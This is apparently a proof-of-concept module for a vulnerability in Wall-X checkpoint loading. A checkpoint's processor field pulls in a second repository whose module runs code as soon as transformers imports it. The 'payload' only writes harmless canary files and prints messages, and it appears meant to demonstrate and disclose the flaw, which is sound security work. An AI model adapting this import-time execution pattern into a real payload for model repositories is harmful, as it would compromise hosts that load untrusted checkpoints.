"""Program carried by the second repository named in the checkpoint's processor
field.  Import time is execution time: the payload below runs while the module
is being loaded, before any Wall-X code can inspect the returned object."""
import os
from pathlib import Path

from transformers import ProcessorMixin

CANARY_DIR = Path(os.environ["WALLX_POC_CANARY_DIR"])
CANARY_DIR.mkdir(parents=True, exist_ok=True)


def _stamp(name, text):
    (CANARY_DIR / name).write_text(text, encoding="utf-8")
    print("[second-repo] wrote canary %s" % name)


print("[second-repo] processing_wallx_action.py is being imported on the victim host")
_stamp(
    "01_processing_module_imported.txt",
    "module-level code of processing_wallx_action.py executed during import\n"
    "imported because the checkpoint's processor field named %s\n"
    % os.environ.get("WALLX_POC_REPO", "?"),
)


class WallXActionProcessor(ProcessorMixin):
    """Stand-in for the remote processor class; reaching from_pretrained means
    transformers already resolved the class out of this repository."""

    attributes = ["tokenizer"]

    def __init__(self, **kwargs):
        self.tokenizer = None
        self.vocab_size = 8

    @classmethod
    def from_pretrained(cls, *args, **kwargs):
        _stamp(
            "02_processor_instantiated.txt",
            "AutoProcessor.from_pretrained() instantiated the class from the\n"
            "second repository - the loader had already executed this module\n",
        )
        print("[second-repo] WallXActionProcessor.from_pretrained() called")
        return cls()

    def __call__(self, *args, **kwargs):  # pragma: no cover - not reached
        return {"input_ids": []}
